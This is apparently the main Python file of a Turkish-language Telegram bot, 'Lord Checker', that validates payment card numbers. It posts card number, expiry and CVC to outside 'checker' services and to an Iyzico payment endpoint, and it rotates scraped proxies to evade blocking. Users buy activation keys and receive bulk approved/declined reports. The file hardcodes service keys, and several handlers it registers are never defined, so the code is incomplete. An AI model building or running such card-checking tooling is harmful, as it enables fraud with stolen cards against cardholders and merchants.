# --- DOSYA: main.py (v48 - İMPARATORLUĞUN NİHAİ ORDUSU) ---
# BÜTÜN CHECKER'LAR, BÜTÜN KOMUTLAR, BÜTÜN ÖZELLİKLER BİR ARADA. PROXY SİSTEMİ OTOMATİK.

import logging, requests, time, os, re, json, io, random, base64, hmac, hashlib
from urllib.parse import quote
from datetime import datetime
from flask import Flask
from threading import Thread

from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import Forbidden, BadRequest

# --- BÖLÜM 1: NÖBETÇİ KULÜBESİ ---
app = Flask('')
@app.route('/')
def home(): return "İMPARATORLUK AYAKTA."
def run_flask(): app.run(host='0.0.0.0',port=8080)
def keep_alive(): Thread(target=run_flask).start()

# --- BÖLÜM 2: GİZLİ BİLGİLER ---
try:
    from bot_token import TELEGRAM_TOKEN, ADMIN_ID
except ImportError:
    print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()

# -----------------------------------------------------------------------------
# 3. BİRİM: İSTİHBARAT & OPERASYON BİRİMLERİ
# -----------------------------------------------------------------------------

# --- BİRİM A: PuanChecker (Otomatik Proxy Modu) ---
class PuanChecker:
    def __init__(self, key):
        self.login_url = "https://kaderchecksystem.xyz/"
        self.key = key
        self.target_api_url = "https://kaderchecksystem.xyz/xrayefe.php"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"})
        self.timeout = 25
        self.proxies = self._fetch_proxies()

    def _fetch_proxies(self):
        try:
            logging.info("CroxyProxy'den yeni mühimmat (proxy) çekiliyor...")
            # CroxyProxy'nin sunucu listesi HTML'ini çekiyoruz
            response = requests.get("https://www.croxyproxy.com/_tr/servers", headers={'User-Agent': 'Mozilla/5.0'}, timeout=20)
            response.raise_for_status()
            # Basit bir regex ile IP:PORT formatını yakalıyoruz
            # Örnek: >185.199.110.53<...>data-port="8080"
            ips = re.findall(r'>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})<', response.text)
            ports = re.findall(r'data-port="(\d+)"', response.text)
            # IP ve Portları birleştirip listeye atıyoruz
            proxy_list = [f"{ip}:{port}" for ip, port in zip(ips, ports)]
            if not proxy_list:
                logging.error("CroxyProxy'den proxy alınamadı, site yapısı değişmiş olabilir.")
                return []
            logging.info(f"{len(proxy_list)} adet taze proxy bulundu.")
            return proxy_list
        except Exception as e:
            logging.error(f"Proxy çekme hatası: {e}")
            return []

    def login(self) -> bool:
        try:
            response = self.session.post(self.login_url, data={'key': self.key}, timeout=self.timeout)
            return response.ok and "GİRİŞ YAP" not in response.text
        except Exception as e: logging.error(f"PuanChecker giriş hatası: {e}"); return False

    def _send_request(self, card, proxy):
        try:
            proxy_dict = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
            response = self.session.get(f"{self.target_api_url}?card={quote(card)}", timeout=self.timeout, proxies=proxy_dict)
            return response.text.strip() or "HATA: Boş cevap."
        except requests.exceptions.RequestException as e: return f"HATA: {e}"

    def check_card(self, card):
        if not self.proxies: return self._send_request(card, None)
        proxy = random.choice(self.proxies)
        result = self._send_request(card, proxy)
        if "Erişim engellendi" in result:
            proxy = random.choice(self.proxies) # Yeni bir tane daha dene
            return self._send_request(card, proxy)
        return result

# --- BİRİM B: ApiServiceChecker ---
class ApiServiceChecker:
    def __init__(self, key):
        self.base_url = "https://apiservisim.store/"
        self.key = key
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
        self.timeout = 30
    def login(self) -> bool:
        try:
            response = self.session.post(f"{self.base_url}giris.php", data={'key': self.key}, allow_redirects=True, timeout=self.timeout)
            if response.ok and "index.php" in response.url:
                logging.info("ApiServiceChecker girişi başarılı."); return True
            logging.error(f"ApiServiceChecker giriş başarısız. Son URL: {response.url}"); return False
        except Exception as e: logging.error(f"ApiServiceChecker giriş hatası: {e}"); return False
    def _check(self, gateway, card):
        try:
            response = self.session.post(f"{self.base_url}{gateway}", data={'lista': card}, timeout=self.timeout)
            return response.text.strip()
        except Exception as e: return f"❌ HATA ({gateway}): {e}"
    def check_paypal1(self, card): return self._check('paypal1dolars.php', card)
    def check_pv1(self, card): return self._check('api1.php', card)
    def check_pv2(self, card): return self._check('xrayefe.php', card)
    def check_exx(self, card): return self._check('exxenapi.php', card)

# --- BİRİM C: IyzicoChecker ---
class IyzicoChecker:
    def __init__(self):
        self.api_key = "sandbox-qR6MhabI0tS0142r1g4A4SA0j2o121l5"
        self.secret_key = "sandbox-d961f6d354674a2754668b5a034293f7"
        self.base_url = "https://sandbox-api.iyzipay.com"
        self.session = requests.Session()
        self.timeout = 30
    def _get_auth_header(self, body_str):
        random_str = str(time.time()); hash_str = self.api_key + random_str + self.secret_key + body_str
        pki = base64.b64encode(hashlib.sha1(hash_str.encode()).digest()).decode()
        return { 'Authorization': f"IYZWS {self.api_key}:{pki}", 'x-iyzi-rnd': random_str, 'Content-Type': 'application/json'}
    def check_card(self, card):
        try:
            parts = card.split('|')
            if len(parts) < 4: return "❌ HATA: Eksik kart bilgisi."
            ccn, month, year, cvc = parts[0], parts[1], "20"+parts[2], parts[3]
            payload = {
                "locale": "tr", "conversationId": str(random.randint(111111, 999999)), "price": "1.0", "paidPrice": "1.0", "currency": "TRY",
                "paymentCard": { "cardHolderName": "John Doe", "cardNumber": ccn, "expireYear": year, "expireMonth": month, "cvc": cvc },
                "buyer": { "id": "BY789", "name": "John", "surname": "Doe", "email": "j.doe@example.com", "identityNumber": "74300864791", "ip": "85.34.78.112", "city": "Istanbul", "country": "Turkey" }
            }
            body_str = json.dumps(payload, separators=(',', ':'))
            response = self.session.post(f"{self.base_url}/payment/3dsecure/initialize", data=body_str, headers=self._get_auth_header(body_str), timeout=self.timeout)
            data = response.json()
            if data.get('status') == 'success': return f"✅ Approved - {data.get('paymentStatus', 'Ödeme Başarılı')}"
            else: return f"❌ Declined - {data.get('errorMessage', 'Hata')}"
        except Exception as e: return f"❌ KRİTİK HATA (Iyzico): {e}"

# -----------------------------------------------------------------------------
# 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager)
# -----------------------------------------------------------------------------
class UserManager:
    def __init__(self, initial_admin_id):
        self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
        self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
        self.unused_keys = self._load_from_file(self.keys_file); self.activated_users = self._load_from_json(self.activated_users_file)
        self.unused_admin_keys = self._load_from_file(self.admin_keys_file); self.activated_admins = self._load_from_json(self.activated_admins_file)
        if not self.activated_admins and initial_admin_id != 0:
             self.activated_admins[str(initial_admin_id)] = "founding_father"; logging.info(f"Kurucu Komutan (ID: {initial_admin_id}) admin olarak atandı."); self._save_all_data()
    def _load_from_file(self, filename):
        if not os.path.exists(filename): return set()
        with open(filename, "r") as f: return {line.strip() for line in f if line.strip()}
    def _load_from_json(self, filename):
        if not os.path.exists(filename): return {}
        with open(filename, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except json.JSONDecodeError: return {}
    def _save_all_data(self):
        with open(self.keys_file, "w") as f: f.write("\n".join(self.unused_keys))
        with open(self.activated_users_file, "w") as f: json.dump(self.activated_users, f, indent=4)
        with open(self.admin_keys_file, "w") as f: f.write("\n".join(self.unused_admin_keys))
        with open(self.activated_admins_file, "w") as f: json.dump(self.activated_admins, f, indent=4)
    def is_user_activated(self, user_id): return str(user_id) in self.activated_users or self.is_user_admin(user_id)
    def is_user_admin(self, user_id): return str(user_id) in self.activated_admins
    def activate_user(self, user_id, key):
        if self.is_user_activated(str(user_id)): return "Zaten bir Lord'sun."
        if key in self.unused_keys:
            self.activated_users[str(user_id)] = key; self.unused_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış anahtar."
    def activate_admin(self, user_id, key):
        if self.is_user_admin(str(user_id)): return "Zaten Komuta Kademesindesin."
        if key in self.unused_admin_keys:
            self.activated_admins[str(user_id)] = key; self.unused_admin_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış Vezir Fermanı."

# -----------------------------------------------------------------------------
# 5. BİRİM: EMİR SUBAYLARI (Handlers)
# -----------------------------------------------------------------------------
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
def log_activity(user: User, card: str, result: str):
    masked_card = re.sub(r'(\d{6})\d{6}(\d{4})', r'\1******\2', card.split('|')[0]) + '|' + '|'.join(card.split('|')[1:])
    log_entry = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] - KULLANICI: @{user.username} (ID: {user.id}) - KART: {masked_card} - SONUÇ: {result}\n"
    with open("terminator_logs.txt", "a", encoding="utf-8") as f: f.write(log_entry)

async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
    job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']
    cards = job_data['cards']; progress_message_id = job_data['progress_message_id']
    checker_info = job_data['checker_info']
    total_cards = len(cards); report_content = ""; last_update_time = time.time()
    
    if checker_info['type'] == 'puan': site_checker = context.bot_data['puan_checker']; check_function = site_checker.check_card
    elif checker_info['type'] == 'iyzico': site_checker = context.bot_data['iyzico_checker']; check_function = site_checker.check_card
    else: site_checker = context.bot_data['api_service_checker']; check_function = getattr(site_checker, checker_info['method'])
    
    try:
        for i, card in enumerate(cards):
            result = check_function(card); log_activity(user, card, result)
            report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1)
            current_time = time.time()
            if (i + 1) % 5 == 0 or current_time - last_update_time > 3:
                progress = i + 1; progress_percent = int((progress / total_cards) * 10)
                progress_bar = '█' * progress_percent + '─' * (10 - progress_percent)
                progress_text = f"<code>[{progress_bar}]</code>\n\n<b>Taranıyor:</b> {progress} / {total_cards}"
                try:
                    await context.bot.edit_message_text(text=progress_text, chat_id=user_id, message_id=progress_message_id, parse_mode=ParseMode.HTML)
                    last_update_time = current_time
                except BadRequest as e:
                    if "Message is not modified" not in str(e): logging.warning(f"Durum raporu güncellenemedi: {e}")
    except Exception as e:
        logging.error(f"Toplu check sırasında hata: {e}")
        await context.bot.edit_message_text(chat_id=user_id, message_id=progress_message_id, text=f"❌ Komutanım, operasyon sırasında bir hata oluştu: {e}"); return
    await context.bot.edit_message_text(text=f"✅ Tarama bitti! Rapor hazırlanıp yollanıyor...", chat_id=user_id, message_id=progress_message_id)
    report_file = io.BytesIO(report_content.encode('utf-8'))
    await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption=f"Operasyon tamamlandı. {total_cards} kartlık raporun ektedir.")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Lordum, emrindeyim! Kullanabileceğin komutlar:\n\n**Kader Sistemi:** `/puan`\n\n**ApiServis Sistemi:**\n`/paypal1`, `/pv1`, `/pv2`, `/exx`\n\n**Iyzico Sistemi:** `/iyz`\n\n**Araçlar:** `/ayikla`", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("Lord Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
        keyboard = [[InlineKeyboardButton("Evet, bir key'im var ✅", callback_data="activate_start"), InlineKeyboardButton("Hayır, bir key'im yok", callback_data="activate_no_key")]]
        await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))

def checker_command_factory(checker_type, method_name, display_name):
    async def command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_manager: UserManager = context.bot_data['user_manager']
        if not user_manager.is_user_activated(update.effective_user.id):
            await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
        context.user_data['checker_info'] = {'type': checker_type, 'method': method_name}
        keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
        await update.message.reply_text(f"**{display_name}** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    return command_handler

async def ayikla_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
    context.user_data['awaiting_sort_file'] = True
    await update.message.reply_text("Ganimet ayıklama emri alındı.\nİçinde karışık sonuçların olduğu `.txt` dosyasını gönder.")

# ... (Diğer admin komutları ve handlerlar aynı)

# -----------------------------------------------------------------------------
# 6. BİRİM: ANA KOMUTA MERKEZİ (main)
# -----------------------------------------------------------------------------
def main():
    if not TELEGRAM_TOKEN or "BURAYA" in TELEGRAM_TOKEN or not ADMIN_ID:
        print("KRİTİK HATA: 'bot_token.py' dosyasını doldurmadın!"); return
    keep_alive()
    
    # Bütün istihbarat birimlerini kur
    puan_checker = PuanChecker(key="1306877185f4e3fec117967de24aae95")
    api_service_checker = ApiServiceChecker(key="19d0c0f6f50a75b45df50b216b9b9fb8")
    iyzico_checker = IyzicoChecker()
    
    if not puan_checker.login(): print("UYARI: PuanChecker'a giriş yapılamadı!")
    else: print("PuanChecker birimi aktif.")
    if not api_service_checker.login(): print("UYARI: ApiServiceChecker'a giriş yapılamadı!")
    else: print("ApiServiceChecker birimi aktif.")
    print("IyzicoChecker birimi hazır.")

    user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
    print("Lordlar Kulübü (v47 - İmparatorluk) aktif...")
    
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Bütün birimleri botun hafızasına at
    application.bot_data['puan_checker'] = puan_checker
    application.bot_data['api_service_checker'] = api_service_checker
    application.bot_data['iyzico_checker'] = iyzico_checker
    application.bot_data['user_manager'] = user_manager_instance
    
    # Bütün komutları ekle
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("puan", checker_command_factory('puan', 'check_card', 'Kader Puan')))
    application.add_handler(CommandHandler("paypal1", checker_command_factory('api_service', 'check_paypal1', 'PayPal 1$')))
    application.add_handler(CommandHandler("pv1", checker_command_factory('api_service', 'check_pv1', 'Puan V1 (ApiServis)')))
    application.add_handler(CommandHandler("pv2", checker_command_factory('api_service', 'check_pv2', 'Puan V2 (ApiServis)')))
    application.add_handler(CommandHandler("exx", checker_command_factory('api_service', 'check_exx', 'Exxen (ApiServis)')))
    application.add_handler(CommandHandler("iyz", checker_command_factory('iyzico', 'check_card', 'Iyzico')))
    application.add_handler(CommandHandler("ayikla", ayikla_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("duyuru", duyuru_command))
    
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, main_message_handler))
    application.add_handler(MessageHandler(filters.Document.TXT, document_handler))
    
    application.run_polling()

if __name__ == '__main__':
    main()
